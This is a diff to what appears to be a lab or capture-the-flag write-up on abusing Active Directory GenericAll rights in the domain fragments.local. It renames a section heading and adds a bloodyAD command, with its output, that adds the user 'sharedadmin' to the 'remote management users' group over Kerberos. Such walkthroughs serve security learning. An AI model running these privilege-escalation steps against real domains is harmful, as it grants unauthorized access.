@@ -643,7 +643,7 @@ So this means i have GenericAll over a lot of high privileged groups, excluding 
 
 There are several methods to abuse this privilege as seen with the 49 instances of outbound object control in bloodhound
 
-# Abusing `dnsadmins`
+# Abusing `iis_users`
 
 So since i have GenericAll over the group itslelf i first have to add my user to the group!
 
@@ -661,6 +661,9 @@ Since im using kerberos becuase of the limitations of the protected users ill st
 export KRB5CCNAME=sharedadmin.ccache
 ```
 
-
+```python
+bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'remote management users' 'sharedadmin' 
+[+] sharedadmin added to remote management users
+```
 
 
